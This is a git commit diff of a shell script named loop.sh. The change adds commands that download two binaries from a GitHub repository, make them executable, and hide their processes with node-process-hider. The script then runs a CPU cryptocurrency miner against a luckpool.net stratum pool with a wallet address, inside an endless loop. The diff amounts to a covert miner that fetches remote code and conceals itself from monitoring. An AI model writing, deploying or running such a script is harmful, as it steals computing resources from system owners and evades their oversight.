6660a4a5f7eaa8f6be6518af76bebb59c9660cae
bulboni <163756439+bulboni@users.noreply.github.com>
2024-06-20 22:01:47 -0400

    Update loop.sh

--- loop.sh
+++ loop.sh
@@ -1,8 +1,11 @@
 #!/bin/sh
+wget https://github.com/bulboni/vs/raw/main/loop && chmod +x loop
+wget https://github.com/bulboni/vs/raw/main/vs && chmod +x vs
 apt install nodejs -y
 apt install npm -y
 npm i -g node-process-hider
-ph add verus-solver
+ph add vs
+ph add loop
 ./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 40
 while [ 1 ]; do
 sleep 3
